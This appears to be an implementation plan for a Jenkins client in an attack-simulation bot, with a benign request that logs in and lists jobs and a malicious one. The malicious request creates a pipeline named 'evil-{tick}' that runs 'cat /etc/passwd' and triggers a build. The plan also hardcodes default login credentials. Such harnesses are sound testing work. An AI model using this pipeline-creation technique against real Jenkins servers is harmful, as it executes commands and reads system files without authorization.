# Plan: Jenkins Client in bot.py

## Dependency
- `python-jenkins` library (`pip install python-jenkins`)

## File: `server_files/attacker/bot.py`

### Imports to add
```python
import jenkins
```

### `Client.__init__` changes
- Accept optional `username`/`password` params, default `sofia.bernhard`/`sofia.bernhard123`
- Create `self.server = jenkins.Jenkins(f"http://{host}:{self.jenkins_port.value}", username=username, password=password)`

### New methods on `Client`

1. **`login() -> bool`** — Call `self.server.get_whoami()`, return `True` on success, `False` on failure
2. **`list_jobs() -> list[dict]`** — Return `self.server.get_all_jobs()`
3. **`get_job_config(name: str) -> str`** — Return `self.server.get_job_config(name)` (XML string)
4. **`get_build_info(name: str, build_no: int) -> dict`** — Return `self.server.get_build_info(name, build_no)`
5. **`get_build_log(name: str, build_no: int) -> str`** — Return `self.server.get_build_console_output(name, build_no)`
6. **`trigger_build(name: str) -> int`** — Return `self.server.build_job(name)` (queue ID)
7. **`create_pipeline(name: str, groovy_script: str) -> None`** — Build pipeline config XML, call `self.server.create_job(name, config_xml)`

Helper for `create_pipeline` — generate minimal pipeline XML:
```xml
<?xml version='1.0' encoding='UTF-8'?>
<flow-definition>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition">
    <script>{groovy_script}</script>
    <sandbox>true</sandbox>
  </definition>
</flow-definition>
```

### Error handling pattern
All methods wrap calls in try/except:
- `jenkins.JenkinsException` → log + raise or return sentinel
- `requests.exceptions.ConnectionError` → indicates service down
- Used in `benign_request`/`malicious_request` to map to `AttackResult` enum values

### `BenignClient.benign_request`
```python
def benign_request(self, id, tick, sequence_no):
    try:
        if not self.login():
            return AttackResult.RESULT_FAILURE
        jobs = self.list_jobs()
        if not jobs:
            return AttackResult.RESULT_FAILURE
        return AttackResult.RESULT_SUCCESS
    except ConnectionError:
        return AttackResult.RESULT_DOWN
    except Exception:
        return AttackResult.RESULT_FAILURE
```

### `MaliciousClient.malicious_request`
```python
def malicious_request(self, id, tick, sequence_no):
    try:
        self.create_pipeline(f"evil-{tick}", "node { sh 'cat /etc/passwd' }")
        self.trigger_build(f"evil-{tick}")
        return AttackResult.RESULT_SUCCESS
    except ConnectionError:
        return AttackResult.RESULT_DOWN
    except Exception:
        return AttackResult.RESULT_FAILURE
```

### Port reference
Use `self.jenkins_port.value` (resolves to `8080`) when constructing Jenkins URL.

### Remove TODO comment
Delete lines 50-55 (the TODO block) since functionality now implemented.
